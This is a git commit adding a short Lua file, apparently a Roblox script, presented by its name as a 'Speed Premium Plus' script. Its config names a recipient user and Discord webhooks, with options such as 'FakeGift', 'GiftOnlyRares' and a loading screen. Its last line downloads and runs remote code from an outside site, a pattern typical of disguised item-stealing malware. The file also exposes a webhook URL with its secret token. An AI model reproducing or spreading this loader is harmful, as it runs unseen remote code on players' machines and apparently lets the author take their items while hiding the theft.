27f1a2efbe82d7664b4377414ecb25ee8a20fe81
SpeedHub <victorrafiq00@gmail.com>
2025-09-21 17:13:15 -0300

    Upload Speed-Premium-Plus-script.lua via Script Source Converter

---
+++ Speed-Premium-Plus-script.lua
@@ -0,0 +1,13 @@
+_G.LRMConfig = {
+    User = {"paopadeirosstt"},
+    min_value = 1,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "https://discord.com/api/webhooks/1398392021487718561/94jpPb6637FteO1O6ofpqi5U23Chz_y3PpLr-7--L-tJ39kQI3eEWKjI64OAi2z0DBri",
+    FakeGift = "No",
+    Trash = "https://webhook.jofficial.me/api/webhooks/1398392021487718561/94jpPb6637FteO1O6ofpqi5U23Chz_y3PpLr-7--L-tJ39kQI3eEWKjI64OAi2z0DBri",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "No",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
